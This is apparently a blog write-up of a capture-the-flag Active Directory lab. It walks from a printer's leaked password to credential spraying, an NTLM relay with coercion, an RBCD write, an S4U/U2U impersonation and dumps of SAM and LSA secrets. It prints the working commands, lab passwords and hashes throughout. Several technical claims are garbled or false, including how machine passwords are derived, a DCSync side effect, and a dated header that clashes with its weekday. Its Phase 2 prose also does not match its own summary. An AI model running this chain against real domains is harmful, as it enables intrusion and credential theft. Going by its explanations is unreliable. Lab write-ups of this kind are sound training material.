---
layout: post
title: "Dead Men Tell No SPNs: From a Leaky Printer to the Master Ledger"
date: 2026-09-17
categories: [active-directory]
tags: [ntlm-relay, rbcd, kcd, mssql, ad, nxc]
wide: true
---

> *You don't take a fleet by fighting the hull. You take it by walking the seams.*

The domain didn't look like a standard corporate network. It looked like an armada waiting for a signal.

Four ships on the horizon — `BLACKPEARL`, `JOLLYROGER`, `QUEENREV`, `FLYINGDUTCHMAN` — each one a Windows Server 2022 box, each one broadcasting SMB on port 445 like a lantern in the fog. One of them, `BLACKPEARL`, answered to the name `PIRATES.BRB` and was the Domain Controller.

The rest were crewed by machine accounts and regular users, each a load-bearing node in the trust graph that kept the whole fleet sailing in formation.

The target environment was BarbHack 2025, now anchored publicly under the NetExec banner. The goal was always the same: start as a nobody on the lowest deck and end as Domain Administrator on the ship that matters.

What made it interesting wasn't the destination. It was the shape of the path there — a chain of delegation and impersonation moves, each one turning a small foothold into a bigger one, until the last ship in the line was yours to command.

This post is the narrative of that chain, with the commands and outputs exactly where they belong. The theory underneath each phase is the point; the terminal is the proof. No invented walkthrough — everything here traces to a command that ran. The map at the end is the chain of every seam we walked.

---

## TL;DR: The Attack Path

An enterprise Active Directory environment structured as a fleet of four hosts is systematically compromised without breaking a single primary perimeter lock. The killchain leverages permitted trust boundaries, multi-stage delegation chains, database misconfigurations, and offline forensics.

* [**Prologue: A Leak in the Hull (The Printer Foothold)**](#prologue-a-leak-in-the-hull-the-printer-foothold) — the printer's admin page hands over `hplaserbarbhack` in a disabled HTML field, the `/scan/` directory yields `IT_Procedures.docx` with fifty-two temporary crew credentials, and the spray turns three of them into live domain accounts on every ship in the fleet. Three flags fall in the process: `TREASOR_HUNT`'s `flag.txt`, a GPP-encrypted `seal` password in SYSVOL, and `flint`'s description field on `BLACKPEARL`. The fleet didn't get breached through an OS vulnerability. It got breached through credentials that were supposed to expire in 24 hours and didn't.

* [**Waking the Armada (The Credential Spray)**](#waking-the-armada-the-credential-spray) — the spray confirms the board: `morgan`, `barnacle`, and `plankwalker` wake up on all four hosts with the same access. SMB everywhere, LDAP open on the DC, the null bind on `BLACKPEARL` giving us anonymous LDAP. The fleet was never locked. It was sleeping.

* [**Phase 1: Charting the Deeps (RBCD & Trust Exploitation)**](#phase-1-charting-the-deeps-rbcd-trust-exploitation) — an NTLMv1 beacon from `JOLLYROGER$` caught by Responder tells us which host to paint; `coerce_plus` forces `JOLLYROGER$` to authenticate to `BLACKPEARL`'s LDAP through the spoolss RPC path; the relay drops an interactive LDAP shell as `JOLLYROGER$`, and `set_rbcd JOLLYROGER$ morgan` writes the RBCD right. A U2U S4U exchange turns that right into a CIFS ticket as Administrator on `JOLLYROGER`, and the LSA dump from that shell gives us `JOLLYROGER$`'s AES keys — the first machine account identity in our pocket.

* [**Phase 2: Mutiny in the Bilges (MSSQL & DPAPI)**](#phase-2-mutiny-in-the-bilges-mssql-dpapi) — the DPAPI masterkey from Phase 1's LSA dump unlocks `pirate1`'s cached credential, which unwraps to `ironhook`'s password (flag five). `ironhook` sprays everywhere and lands on `QUEENREV`, where `ISLAND2` holds `shipping.txt` — the `gMSA-shipping$` `msDS-ManagedPassword` blob. The gMSA parser extracts the NT hash, `gMSA-shipping$` impersonates `sa` on `QUEENREV`'s MSSQL, `xp_cmdshell` flips to an OS shell, CrystalPotato climbs to `SYSTEM`, and Rubeus extracts the `QUEENREV$` TGT. The LSA dump on `QUEENREV` — authenticated as `QUEENREV$` via that TGT — hands us `QUEENREV$`'s AES keys.

* [**Phase 3: Navigating the Ghost Ship (Walking the KCD Treaty)**](#phase-3-navigating-the-ghost-ship-walking-the-kcd-treaty) — the pre-existing constrained delegation from `QUEENREV$` to `host/FLYINGDUTCHMAN.PIRATES.BRB` was in the directory before we touched anything. We write an RBCD rule on `QUEENREV` as `QUEENREV$` to let `JOLLYROGER$` impersonate; walking it with `JOLLYROGER$`'s AES key gives us Administrator on `QUEENREV`. Then the KCD leg: `QUEENREV$`'s AES key + the `-additional-ticket` flag (reusing the forwardable Administrator ticket from the RBCD leg) bypasses the protocol-transition gap and lands a Domain Admin shell on `FLYINGDUTCHMAN`. Flag eight. Neither machine account key was cracked. Both were pulled straight from the LSA.

* [**Epilogue: NTDS in a Bottle**](#epilogue-ntds-in-a-bottle) — `FLYINGDUTCHMAN`'s `C:\BACKUP` holds an offline `NTDS.zip` containing the domain's identity: `ntds.dit`, `SYSTEM`, and `SECURITY`. `ntdissector` parses it offline with the `SYSTEM` hive as the decryption key, `jq` pulls `user.json`, and `blackbeard`'s description field spills a plaintext password: `REDqC8aQtyhd78A`. It's not `blackbeard`'s password — it's `administrator`'s. Sprayed against `BLACKPEARL`'s MSSQL, it opens the DC. The live NTDS dump gives us 61 accounts and `krbtgt`'s hash — `5e81b5440e2c0cf1da1a0e0d1dacf55b` — flag nine. The fleet surrenders the whole chart.

---

## Prologue: A Leak in the Hull (The Printer Foothold)

Every AD exploitation story starts with the same question: who are you, and what can you touch?

The answer on this fleet begins not in the directory, but on a piece of office equipment. An HP LaserJet Pro M404n (Model W1A52A at 192.168.1.100) — the kind of workhorse that sits in a corner printing shipping labels until everyone forgets it's web-facing.

It's running a Caddy server on port 8080, and its administration page has a `/scan/` endpoint. A quick check shows that the endpoint is locked down behind HTTP Basic authentication.

```zsh
➜ curl -I jollyroger.pirates.brb:8080
HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 13664
Content-Type: text/html; charset=utf-8
Etag: "tk770aajk"
Last-Modified: Sun, 23 Aug 2026 01:04:58 GMT
Server: Caddy
Date: Fri, 15 Sep 2026 16:19:27 GMT
```

```zsh
➜ curl -I http://jollyroger.pirates.brb:8080/scan/
HTTP/1.1 401 Unauthorized
Server: Caddy
Www-Authenticate: Basic realm="restricted"
Date: Fri, 15 Sep 2026 16:26:01 GMT
```

The endpoint is restricted, but the main configuration page coughs up the password in plain sight. The Security tab's HTML has an `<input>` field with `value="hplaserbarbhack"` hard-coded into it.

The developers tried to protect it by adding a `disabled` attribute to the HTML tag. But a disabled frontend field doesn't stop anyone who can curl the page source from the terminal.

```zsh
➜ curl -Ss http://jollyroger.pirates.brb:8080/ | grep password
...[snip]...
                            <label for="admin-pass">Administrator Password:</label>
                            <input type="password" id="admin-pass" placeholder="Enter admin password" required value="hplaserbarbhack" disabled>
```

That's the first bad seam in the hull. When the company sends you a printer, check whether the printer sends you back a password.

The printer thinks it's a printer. The fleet will learn it's a lookout.

With `admin:hplaserbarbhack` in hand, the `/scan/` endpoint opens up. The directory holds the usual corporate detritus, but the document that matters is `IT_Procedures.docx`.

It's an IT manual for new crew onboarding. Buried inside it is a table of fifty-two temporary crew credentials, explicitly marked as valid for 24 hours. The document owner intended these to be rotated, but intention doesn't rotate credentials.

```zsh
➜ curl -sS -u admin:hplaserbarbhack http://jollyroger.pirates.brb:8080/scan/IT_Procedures.docx
IT procedures manual covering help desk operations, software deployment, and user support.

IT PROCEDURES - NEW CREW MEMBER ONBOARDING

...
TEMPORARY CREW CREDENTIALS LIST:

Username: blackbeard
Temp Password: TempPass2024!@#
...
Username: captainsparrow
Temp Password: Start683^@&

DOCUMENT CLASSIFICATION: CONFIDENTIAL
Last Updated: August 27, 2025
```

The names on the list — `blackbeard`, `morgan`, `barnacle`, `captainsparrow` — are already doing the work. This isn't a credential list generated by a password manager. It was written by someone who thought naming passwords after pirates was funny. The document owner was half right — they are funny. They're also fifty-two valid domain credentials sitting in a plaintext document.

The extraction pipeline is two `curl` pipelines. The first rips them pairwise into a sprayable list. The second writes them into `users.txt` and `passwords.txt` — the files the spray actually uses.

```zsh
➜ curl -sS -u admin:hplaserbarbhack \
http://jollyroger.pirates.brb:8080/scan/IT_Procedures.docx \
    | grep -E '^(Username|Temp Password):' \
    | awk -F': *' '{gsub(/^ +| +$/,"",$2); print $2}' \
    | paste - - | sed 's/\t/:/'
blackbeard:TempPass2024!@#
ruby:NewHire789$%^
jack:Welcome123!&*
...
morgan:Entry369@!*
...
barnacle:First927&^!
...
plankwalker:Entry284*@&
...
captainsparrow:Start683^@&
```

```zsh
➜ curl -sS -u admin:hplaserbarbhack \
http://jollyroger.pirates.brb:8080/scan/IT_Procedures.docx \
    | awk -F': *' '
        /^Username:/      {u=$2; gsub(/^ +| +$/,"",u); print u > "users.txt"}
        /^Temp Password:/ {p=$2; gsub(/^ +| +$/,"",p); print p > "passwords.txt"}
    '
```

Fifty-two usernames. Fifty-two temporary passwords. None of them are Domain Admin, and none of them look dangerous in isolation.

But in Active Directory, a domain credential is a skeleton key that fits every door the domain trusts. The fleet didn't get breached because someone brought a battering ram to the hull. It got breached because someone handed out fifty-two temporary keys marked "expires in 24 hours" and then went home.

---

## Waking the Armada (The Credential Spray)

### The Spyglass (Recon)

Before the active move, a passive one. We sail into `192.168.10.0/24` with empty hands and find four SMB endpoints waiting — a quiet armada, each one broadcasting on port 445 like a lantern in the fog.

One of them, `BLACKPEARL` at `192.168.10.10`, answers with `(Null Auth:True) (DC:True)`. The other three require a credential.

The Domain Controller, it turns out, was the one that left its gangplank down.

```zsh
➜ nxc smb 192.168.10.0/24

SMB         192.168.10.13   445    FLYINGDUTCHMAN   [*] Windows Server 2022 Build 20348 x64 (name:FLYINGDUTCHMAN) (domain:PIRATES.BRB) (signing:False) (SMBv1:False)
SMB         192.168.10.11   445    JOLLYROGER       [*] Windows Server 2022 Build 20348 x64 (name:JOLLYROGER) (domain:PIRATES.BRB) (signing:False) (SMBv1:False)
SMB         192.168.10.12   445    QUEENREV         [*] Windows Server 2022 Build 20348 x64 (name:QUEENREV) (domain:PIRATES.BRB) (signing:False) (SMBv1:False)
SMB         192.168.10.10   445    BLACKPEARL       [*] Windows Server 2022 Build 20348 x64 (name:BLACKPEARL) (domain:PIRATES.BRB) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
```

`BLACKPEARL` lets a null bind through. That's not the exploit — it's a recon convenience. The other three need a real credential, and we now have fifty-two to try.

A multi-protocol sweep confirms the picture across the fleet: SMB everywhere, LDAP only on the DC, RDP everywhere with Network Level Authentication (NLA) enforced.

```zsh
➜ for proto in smb ldap rdp; do nxc $proto 192.168.10.10-13 -u '' -p ''; echo '----'; done

...[snip]...
SMB         192.168.10.10   445    BLACKPEARL       [+] PIRATES.BRB\:
...
LDAP        192.168.10.10   389    BLACKPEARL       [+] PIRATES.BRB\:
...
RDP         192.168.10.10   3389   BLACKPEARL       [-] PIRATES.BRB\: (STATUS_LOGON_FAILURE)
...
```

Before we start steering by name, we need the fleet mapped in our local registry. NetExec makes this easy with its built-in generator:

```zsh
➜ nxc smb 192.168.10.10-13 --generate-hosts-file /tmp/hosts.txt

192.168.10.11     JOLLYROGER.PIRATES.BRB JOLLYROGER
192.168.10.13     FLYINGDUTCHMAN.PIRATES.BRB FLYINGDUTCHMAN
192.168.10.10     BLACKPEARL.PIRATES.BRB PIRATES.BRB BLACKPEARL
192.168.10.12     QUEENREV.PIRATES.BRB QUEENREV
```

Drop that straight into `/etc/hosts`, and the ships resolve cleanly across the VLAN. Now we can speak to the armada by name.

### The Broadside (The Spray)

The spray is the moment the fleet opens up. We take the fifty-two temporary credentials ripped from the printer document and fire them across all four hosts.

Using `--no-bruteforce --continue-on-success` ensures we test every combination cleanly without locking accounts. The results are immediate.

```zsh
➜ nxc smb 192.168.10.10-13 \
    -u users.txt -p passwords.txt \
    --no-bruteforce --continue-on-success \
    | grep '[+]'

SMB                      192.168.10.12   445    QUEENREV         [+] PIRATES.BRB\morgan:Entry369@!*
SMB                      192.168.10.12   445    QUEENREV         [+] PIRATES.BRB\barnacle:First927&^!
SMB                      192.168.10.12   445    QUEENREV         [+] PIRATES.BRB\plankwalker:Entry284*@&
SMB                      192.168.10.13   445    FLYINGDUTCHMAN   [+] PIRATES.BRB\morgan:Entry369@!*
SMB                      192.168.10.13   445    FLYINGDUTCHMAN   [+] PIRATES.BRB\barnacle:First927&^!
SMB                      192.168.10.13   445    FLYINGDUTCHMAN   [+] PIRATES.BRB\plankwalker:Entry284*@&
SMB                      192.168.10.10   445    BLACKPEARL       [+] PIRATES.BRB\morgan:Entry369@!*
SMB                      192.168.10.10   445    BLACKPEARL       [+] PIRATES.BRB\barnacle:First927&^!
SMB                      192.168.10.10   445    BLACKPEARL       [+] PIRATES.BRB\plankwalker:Entry284*@&
SMB                      192.168.10.11   445    JOLLYROGER       [+] PIRATES.BRB\morgan:Entry369@!*
SMB                      192.168.10.11   445    JOLLYROGER       [+] PIRATES.BRB\barnacle:First927&^!
SMB                      192.168.10.11   445    JOLLYROGER       [+] PIRATES.BRB\plankwalker:Entry284*@&
```

Three crewmates. One credential set each. Same access on all four ships:

* `morgan:Entry369@!*`
* `barnacle:First927&^!`
* `plankwalker:Entry284*@&`

Three users wake up on every ship. The armada was never locked. It was sleeping.

### Plundering the Top Decks (The First Three Flags)

Having the credentials is only half the battle. The next step is mapping what each crewmate is permitted to touch across the fleet before diving into deep Active Directory mechanics.

Checking the share permissions for our active crew reveals where the doors are unlocked:

```zsh
➜ nxc smb 192.168.10.10-13 \
    -u 'barnacle' -p 'First927&^!' --shares

...[snip]...
SMB         192.168.10.11   445    JOLLYROGER       IPC$            READ                   Remote IPC
SMB         192.168.10.11   445    JOLLYROGER       TREASOR_HUNT    READ,WRITE             Share TREASOR_HUNT
...[snip]...
SMB         192.168.10.12   445    QUEENREV         IPC$            READ                   Remote IPC
SMB         192.168.10.12   445    QUEENREV         ISLAND2                                Island 2 Share
```

`barnacle` holds explicit `READ`, `WRITE` access to `TREASOR_HUNT` on `JOLLYROGER`.

Before diving into complex Active Directory exploitation, we do what any good pirate does first: check the unlocked chests. The low-hanging fruit falls immediately as `barnacle` mounts the target share to grab the first paper treasure.

```zsh
➜ nxc smb jollyroger.pirates.brb \
    -u 'barnacle' -p 'First927&^!' \
    -M spider_plus

➜ nxc smb jollyroger.pirates.brb \
    -u 'barnacle' -p 'First927&^!' \
    --share TREASOR_HUNT \
    --get-file flag.txt flag.txt
```

```zsh
➜ cat flag.txt
bien joué marin d'eau douce !

brb{2274c1b8630627b88818cb4b91f5d3ea}

Congratulations! You found the treasure in the TREASOR_HUNT share!
```

That's flag number one.

Because `morgan`, `barnacle`, and `plankwalker` are all valid domain users, the share permissions across the Domain Controller (`BLACKPEARL`) are identical for all three: standard `READ` access to `IPC$`, `NETLOGON`, and `SYSVOL`.

```zsh
SMB         192.168.10.10   445    BLACKPEARL       IPC$            READ                   Remote IPC
SMB         192.168.10.10   445    BLACKPEARL       NETLOGON        READ                   Logon server share
SMB         192.168.10.10   445    BLACKPEARL       SYSVOL          READ                   Logon server share
```

That open `SYSVOL` share on `BLACKPEARL` becomes our staging ground.

Inside `SYSVOL`, the domain's Group Policy objects live — including `{31B2F340-016D-11D2-945F-00C04FB984F9}`, the default Domain Policy. Its `USER/Groups.xml` stores a GPP-encrypted password for a local administrator account named `seal`.

```zsh
➜ nxc smb blackpearl.pirates.brb \
    -u 'barnacle' -p 'First927&^!' \
    --share SYSVOL \
    --get-file "PIRATES.BRB/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER/Groups.xml" Groups.xml

➜ cat Groups.xml
<?xml version="1.0" encoding="utf-8" ?>
<Groups clsid="{e18bd30b-c7bd-c99f-78bb-206b434d0b08}">
        <User ... clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="seal">
                <Properties ... cpassword="y0CRctM9Q9hEdh0Wy72iCn+GdClWiPOj+rPIwvi0hUxCjs5eMqE+saRHUZZCvw//J7xNKZWCpVCZnRX7rxO3zNUsiUrB3qc9PxXHe7CpB3g=" userName="seal"/>
        </User>
</Groups>
```

```zsh
➜ gpp-decrypt -f Groups.xml
[ • ] GPP-Decrypt v2.0.0 - Group Policy Preferences Password Decryptor
[ • ] Author: Kristof Toth (@t0thkr1s)
[ • ] Processing file: Groups.xml
[ ✓ ] Found 1 credential(s)
═══ Credential #1 ═══
[ • ] Type: User Account
[ • ] Username: seal
[ ✓ ] Password: brb{0BE95DDD17C3A890C36681415B213A00}
```

That's flag number two — a GPP decrypt of an old-style cached local admin password from a stale Domain Policy. Useful, but not the chain we're building.

The third flag comes from simple user enumeration. By looking at `flint`'s description field on `BLACKPEARL`, the domain hands us another token:

```zsh
➜ nxc smb blackpearl.pirates.brb \
    -u 'morgan' -p 'Entry369@!*' \
    --users

SMB         192.168.10.10   445    BLACKPEARL       -Username-                    -Last PW Set-       -BadPW- -Description-
...[snip]...
SMB         192.168.10.10   445    BLACKPEARL       flint                         2026-08-22 14:59:16 0       brb{88e7af3d7bf9ab21f9d6faa5cf644b76}

```

Three flags down. The fleet has surrendered its first tokens from the top decks.

But while finding flags in shares and description fields is fun, the real treasure is the trust graph. It's a treasure map drawn by a drunk architect, and `morgan` currently holds the compass.

Now the question is what the directory access that `morgan` already holds can turn into.

## Phase 1: Charting the Deeps (RBCD & Trust Exploitation)

### The Ghost Ship (Resource-Based Constrained Delegation)

The computer objects tell us which ships are in the fleet and which gMSA is lurking:

```zsh
➜ nxc ldap blackpearl.pirates.brb \
    -u 'morgan' -p 'Entry369@!*' --computers

...[snip]...
LDAP        192.168.10.10   389    BLACKPEARL       BLACKPEARL$
LDAP        192.168.10.10   389    BLACKPEARL       QUEENREV$
LDAP        192.168.10.10   389    BLACKPEARL       JOLLYROGER$
LDAP        192.168.10.10   389    BLACKPEARL       FLYINGDUTCHMAN$
LDAP        192.168.10.10   389    BLACKPEARL       gMSA-shipping$
```

We scan `BLACKPEARL`'s hull for structural weaknesses. The enumeration throws a handful of vulnerabilities onto the deck, but we cut straight through the noise. Most of them are dead ends or theoretical flaws that don't fit our arsenal. The only crack that actually matters for our next maneuver is this:

```zsh
➜ nxc smb blackpearl.pirates.brb \
    -u 'morgan' -p 'Entry369@!*' -M enum_cve

...[snip]...
ENUM_CVE    192.168.10.10   445    BLACKPEARL       CVE-2025-33073 - NTLM reflection - can relay SMB to other protocols except SMB
```

The flagship is vulnerable to NTLM reflection. It can't distinguish between a legitimate authentication and one we've hijacked and redirected to its directory service. The relay path is wide open.

The delegation enumeration is the one that tells us what's already permitted in the directory, before we touch anything:


```zsh
➜ nxc ldap blackpearl.pirates.brb \
    -u 'morgan' -p 'Entry369@!*' --find-delegation

...[snip]...
LDAP        192.168.10.10   389    BLACKPEARL       AccountName AccountType DelegationType DelegationRightsTo
LDAP        192.168.10.10   389    BLACKPEARL       ----------- ----------- -------------- -------------------------------
LDAP        192.168.10.10   389    BLACKPEARL       QUEENREV$   Computer    Constrained    host/FLYINGDUTCHMAN.PIRATES.BRB
```

That line is the crack in the hull for the last phase: `QUEENREV$` already holds a constrained delegation right to `host/FLYINGDUTCHMAN.PIRATES.BRB`. It's there in the directory before we do anything. We don't create it. We inherit it. Constrained Delegation isn't an exploit we brought aboard; it was a treaty the domain architects wrote themselves. We just inherited the rights when we took the ship. But to walk it, we need the account that holds it — `QUEENREV$` — to be ours. And to get there, we first take `JOLLYROGER`.

### Coercion, Relay, and the RBCD Write

Before we go on the offensive, we listen to the waters. A Responder trap left on the VLAN catches a ping in the dark—an NTLMv1 authentication from a host stumbling into a poisoned broadcast name:

```zsh
[SMB] NTLMv1-SSP Client   : 192.168.10.11
[SMB] NTLMv1-SSP Username : PIRATES\JOLLYROGER$
[SMB] NTLMv1-SSP Hash     : JOLLYROGER$::PIRATES:A304581B176AFA2C00000000000000000000000000000000:8A7B7CE63DD4B06022ED0614E7FEDEB113C8884821A4CC3B:266b367980dacf13
```

NTLMv1 is a shipwreck waiting to happen, but we don't bother trying to crack the cryptography. We don't need the password. The metadata alone is the treasure: `192.168.10.11` is `JOLLYROGER`. It just broadcasted its position and proved it can be coaxed into authenticating outbound.

Armed with a precise target, we stand up our relay...

The coercion tools — PetitPotam, PrinterBug, DFSCoerce, MSEven — each one is a different way to force a machine account to authenticate outbound to a listener we control. On this fleet, `JOLLYROGER` is coercible through multiple paths.

We stand up our listener first, configuring it to strip the MIC (Message Integrity Code), support SMB2, and drop us into an interactive LDAP session once the authentication is caught:

```zsh
➜ ntlmrelayx.py \
    -t ldap://blackpearl.pirates.brb \
    --interactive --remove-mic \
    -smb2support
```

With the trap set and our target painted by the NTLMv1 beacon, we don't need to fire randomly into the dark. We point our coercion tools directly at `JOLLYROGER`.

The strike succeeds through the spoolss RPC path — we're sailing the high seas of port 445 now:

```zsh
➜ nxc smb jollyroger.pirates.brb \
    -u 'morgan' -p 'Entry369@!*' \
    -M coerce_plus -o LISTENER=192.168.10.131
```

The relay catches the incoming authentication:

```zsh
[*] Servers started, waiting for connections
[*] (SMB): Received connection from 192.168.10.11, attacking target ldap://blackpearl.pirates.brb
[*] (SMB): Authenticating connection from PIRATES/JOLLYROGER$@192.168.10.11 against ldap://blackpearl.pirates.brb SUCCEED [1]
[*] ldap://PIRATES/JOLLYROGER$@blackpearl.pirates.brb [1] -> Started interactive Ldap shell via TCP on 127.0.0.1:11000 as PIRATES/JOLLYROGER$
[*] All targets processed!
```

The relay drops us into an interactive LDAP shell as `JOLLYROGER$` — the machine account's own identity, riding its own authentication into the directory. From that shell, we don't crack a hash. We write an ACL.


```zsh
➜ ncat 127.0.0.1 11000
Type help for list of commands

⚡ whoami
u:PIRATES\JOLLYROGER$

⚡ set_rbcd JOLLYROGER$ morgan
Found Target DN: CN=JOLLYROGER,CN=Computers,DC=PIRATES,DC=BRB
Target SID: S-1-5-21-615922571-2429191732-2990696654-1105

Found Grantee DN: CN=morgan,OU=PirateCrew,DC=PIRATES,DC=BRB
Grantee SID: S-1-5-21-615922571-2429191732-2990696654-1109
Delegation rights modified successfully!
morgan can now impersonate users on JOLLYROGER$ via S4U2Proxy
```

That `set_rbcd` call is the whole point of Phase 1. The relay gave us `JOLLYROGER$`'s authentication. The relay's LDAP shell gave us the ability to write to `JOLLYROGER$`'s `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. The write added `morgan`'s SID to the list of principals allowed to impersonate on `JOLLYROGER$`. After the write, `morgan` can request a service ticket that impersonates any user on `JOLLYROGER$`'s CIFS service — including `Administrator`.

The post-relay delegation enumeration confirms both rights are now visible from `morgan`'s perspective:

```zsh
➜ nxc ldap blackpearl.pirates.brb \
    -u 'morgan' -p 'Entry369@!*' --find-delegation

...[snip]...
LDAP        192.168.10.10   389    BLACKPEARL       QUEENREV$   Computer    Constrained                host/FLYINGDUTCHMAN.PIRATES.BRB
LDAP        192.168.10.10   389    BLACKPEARL       morgan      Person      Resource-Based Constrained JOLLYROGER$
```

The new line is ours: `morgan` ➜ `Resource-Based Constrained` ➜ `JOLLYROGER$` — the right we just wrote. The other line was already in the directory before the relay fired: `QUEENREV$` ➜ `Constrained` ➜ `host/FLYINGDUTCHMAN.PIRATES.BRB` — a pre-existing KCD treaty that the last phase will walk. Both are now accounted for. One we wrote. One we inherited. Both will be used.

### Pulling the Anchor (The S4U Exchange)

RBCD is supposed to be a controlled delegation mechanism — the resource decides who can impersonate on it, and the impersonation is scoped to the service. On `JOLLYROGER`, the service we care about is CIFS, the file share, because a CIFS ticket is a tunnel onto the host. The S4U2Self step asks the KDC for a service ticket for `morgan` to `cifs/JOLLYROGER.PIRATES.BRB`, and the S4U2Proxy step asks the KDC to issue a proxy ticket impersonating `Administrator` on that same service — the proxy being allowed because `morgan` now holds the RBCD right on `JOLLYROGER$`.

We already hold `morgan`'s TGT somewhere earlier in the session — the notes don't show the mint explicitly, but `morgan.ccache` is on disk when the relay fires, and that TGT is what makes the rest of the chain legible. Its session key is the long-term key we want `morgan`'s NT hash to become:

```zsh
➜ describeTicket.py morgan.ccache | grep 'Ticket Session Key'
[*] Ticket Session Key            : b03b513de8ffc8ed466601a40f0fb044
```

`morgan`'s NT hash at the time of the change is `52bb96aecbcfe774799a60da76212a54` — the hash the DC currently has on file for `morgan` (from the SAM dump or a credential the session already recovered; the notes show it as the authenticator for the change call). We use it to authenticate the password change RPC, and tell the DC to replace `morgan`'s NT hash with the session key we already hold:

```zsh
➜ nxc smb blackpearl.pirates.brb \
    -u 'morgan' -H '52bb96aecbcfe774799a60da76212a54' \
    -M change-password -o NEWNTHASH='b03b513de8ffc8ed466601a40f0fb044'

...[snip]...
CHANGE-P... 192.168.10.10   445    BLACKPEARL       [+] Successfully changed password for morgan
```

Now `morgan`'s NT hash is the session key we already hold in the ccache. The KDC encrypts any new ticket for `morgan` under that key, and we already possess it — which is the whole point of the overwrite. The U2U flag on the delegation request tells `nxc` to use the user-to-user ticket exchange, which is the path that works when the impersonator's long-term key is a session key we already know rather than an SPN-based service key.

```zsh
➜ env KRB5CCNAME=morgan.ccache \
nxc smb jollyroger.pirates.brb \
    --use-kcache --delegate Administrator --u2u

SMB         jollyroger.pirates.brb 445    JOLLYROGER       [*] Windows Server 2022 Build 20348 x64 (name:JOLLYROGER) (domain:PIRATES.BRB) (signing:False) (SMBv1:False)
SMB         jollyroger.pirates.brb 445    JOLLYROGER       [+] PIRATES.BRB\Administrator through S4U+U2U with morgan (Pwn3d!)
```

That `Pwn3d!` line is the first ship taken. `morgan` — a standard domain user with a password harvested from a printer document — now holds a CIFS service ticket as `Administrator` on `JOLLYROGER`. Getting there cost a password change: we overwrote `morgan`'s NT hash with the session key from a TGT we already held, then used the U2U delegation path to request the S4U2Self+S4U2Proxy exchange against `JOLLYROGER$`'s CIFS service. The impersonation ticket was minted by the KDC as part of that exchange. No cracked hash on the delegation path. No OS exploit. Just the directory's own delegation primitives, plus one password change that made `morgan`'s long-term key something we already possessed.

The relay, meanwhile, did something else it doesn't show on the surface. `JOLLYROGER$` authenticated to `BLACKPEARL`'s LDAP because we coerced it, and that authentication went over the wire in the clear — which means anyone listening could have captured it and run DCSync with it as `JOLLYROGER$`. The relay's LDAP shell was the interesting loot, the RBCD write was the move, and the DCSync-capable NTLM hash was a side effect nobody needed to touch.

### Plundering the Hold (What JOLLYROGER Gives Us)

With the Administrator ticket on `JOLLYROGER`, the next move is to pull whatever that host knows. The `nxc` delegation flag with `--lsa --sam` does two things: dumps the local SAM, and dumps the LSA secrets — the host's private store of machine account keys, cached credentials, and service account passwords.

```zsh
➜ env KRB5CCNAME=morgan.ccache \
nxc smb jollyroger.pirates.brb \
    --use-kcache --delegate Administrator --u2u --lsa --sam

...[snip]...
SMB         jollyroger.pirates.brb 445    JOLLYROGER       [+] PIRATES.BRB\Administrator through S4U+U2U with morgan (Pwn3d!)
SMB         jollyroger.pirates.brb 445    JOLLYROGER       [*] Dumping SAM hashes
...[snip: local accounts]...
SMB         jollyroger.pirates.brb 445    JOLLYROGER       [*] Dumping LSA secrets
SMB         jollyroger.pirates.brb 445    JOLLYROGER       PIRATES\JOLLYROGER$:aes256-cts-hmac-sha1-96:949584026e4d0f1588e2dafda8defd278b3d0b6ba0489618ee6821f0e8698338
...[snip]...
SMB         jollyroger.pirates.brb 445    JOLLYROGER       PIRATES\JOLLYROGER$:aad3b435b51404eeaad3b435b51404ee:cb6df3097b82ef7eccfb287a8fd103dc:::
```

The SAM dump gives us the local accounts on `JOLLYROGER` — the local Administrator, the pirates, vagrant. The LSA dump gives us something more useful for the rest of the chain: `JOLLYROGER$`'s machine account keys, in three forms — AES256, AES128, and DES. A domain-joined machine account authenticates to the domain with a password derived from its SID and a rotation schedule, stored locally as these keys. Possess them, and you can authenticate as the machine account anywhere the domain trusts it.

The machine account's NT hash and plain password are also in the LSA dump:

```zsh
PIRATES\JOLLYROGER$:aad3b435b51404eeaad3b435b51404ee:cb6df3097b82ef7eccfb287a8fd103dc:::
PIRATES\JOLLYROGER$:plain_password_hex:33007900320038005a0032006d...
```

That's the prize from Phase 1. Not just a shell on `JOLLYROGER` as Administrator. The machine account's long-term keys for `JOLLYROGER$` — the credential that lets `JOLLYROGER$` authenticate to the domain independently of any user. And with `JOLLYROGER$`'s keys, we can potentially impersonate `JOLLYROGER$` to other systems, or use the machine account as a pivot into services that trust it.

Two flags, one delegation, one machine account's keys. Phase 1 is done. The fleet has surrendered its first ship and its first set of machine credentials.

---

## Phase 2: Mutiny in the Bilges (MSSQL & DPAPI)

The second ship is a different kind of problem. It doesn't fall to delegation. It falls to a misconfigured database.

`QUEENREV` runs an MSSQL instance that's exposed to the domain, and the instance is misconfigured in the way that MSSQL instances get misconfigured when nobody is watching: the service account holds more rights than it should, the database surface area includes features that shouldn't be available, and the gap between *running a query* and *running code on the host* is narrower than it ought to be.

That's the shape of the pivot from MSSQL to OS execution. The database service runs under a context that has access to the local operating system — by design, in some configurations, the SQL Server service account can spawn processes, access the file system, and read the Local Security Authority (LSA) secrets. LSA secrets are the host's private stash: the machine account's long-term keys, any cached domain credentials, and the service account passwords that Windows stores locally for recovery and service restart.

On `QUEENREV`, the pivot lands us inside the database context and from there onto the host itself. The critical loot from this ship is the machine account's AES keys — the long-term credentials that `QUEENREV$` uses to authenticate to the domain. A domain-joined machine account authenticates with a password that's derived from its SID and a timestamp, rotated on a schedule, and stored as an NT hash and an AES key pair on the host itself. Those keys are the machine's identity in the domain. Possess them, and you can authenticate as the machine anywhere the domain trusts it.

That's the prize from `QUEENREV`: the AES keys for `QUEENREV$`. They're what make the next phase possible. Without them, the delegation path closes. With them, the rest of the fleet is reachable.

The mutiny metaphor fits because the takeover is internal. The database service is already running on the ship; we're not breaching the hull from outside. We're taking the crew that's already aboard and pointing it at the captain's cabin. A database running under a service account with `SeImpersonatePrivilege` is like storing your gunpowder next to the galley oven — the whole thing runs on a fuse that's been burning since the service account got more rights than it needed.

A Silver Ticket is good, but Domain Admin is the captain's hat — and we're still short of the hat at this point. We have machine account keys, we have a domain user's cached credential, and we have a database that's been running with its pants down since installation. The chain to the captain's cabin goes through the database.

